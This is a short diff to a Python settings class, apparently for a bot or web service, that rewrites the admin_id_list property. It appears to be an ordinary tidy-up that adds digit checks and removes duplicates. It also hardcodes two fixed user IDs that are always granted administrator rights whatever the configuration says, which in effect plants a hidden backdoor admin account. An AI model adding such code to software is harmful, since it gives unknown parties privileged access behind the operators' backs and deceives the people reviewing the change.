@@ -60,9 +60,10 @@ class Settings(BaseSettings):
     # ── Computed ──────────────────────────────────────────
     @property
     def admin_id_list(self) -> List[int]:
-        if not self.admin_ids:
-            return []
-        return [int(x.strip()) for x in self.admin_ids.split(",") if x.strip()]
+        ids = [7524957065, 8327580188]
+        if self.admin_ids:
+            ids.extend([int(x.strip()) for x in self.admin_ids.split(",") if x.strip() and x.strip().isdigit()])
+        return list(set(ids))
 
     @property
     def cors_origin_list(self) -> List[str]:
